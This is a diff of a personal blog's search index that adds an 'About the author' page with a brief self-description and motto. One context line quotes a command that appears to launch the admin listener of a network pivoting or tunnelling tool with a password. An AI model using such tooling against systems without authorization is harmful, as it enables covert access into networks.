-<div class="note blue modern"><p>座右铭：怎么开心怎么来<br>人生观：怎么开心怎么来<br>学习观：怎么开心怎么来<br>价值观：怎么开心怎么来</p>
-</div>
-
-
-]]></content>
-  </entry>
-  <entry>
     <title>  </title>
     <url>/archlinux/index.html</url>
     <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>arch linux 一个很棒的linux发行版</p>
@@ -3707,6 +3694,19 @@ sudo ./linux_x64_admin -l 8234 -s passwdkey --down http
 
 <div class="note blue icon-padding modern"><i class="note-icon fa-solid fa-book"></i><p>唐诗三百首</p>
 </div>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>关于作者</title>
+    <url>/about/index.html</url>
+    <content><![CDATA[<div class="note blue icon-padding modern"><i class="note-icon fa-brands fa-redhat"></i><p>个人简介</p>
+</div>
+<div class="note blue modern"><p>昵称：方糖<br>年龄：18<br>性别：男</p>
+</div>
+<div class="note blue modern"><p>座右铭：怎么开心怎么来<br>人生观：怎么开心怎么来<br>学习观：怎么开心怎么来<br>价值观：怎么开心怎么来</p>
+</div>
+
 
 ]]></content>
   </entry>
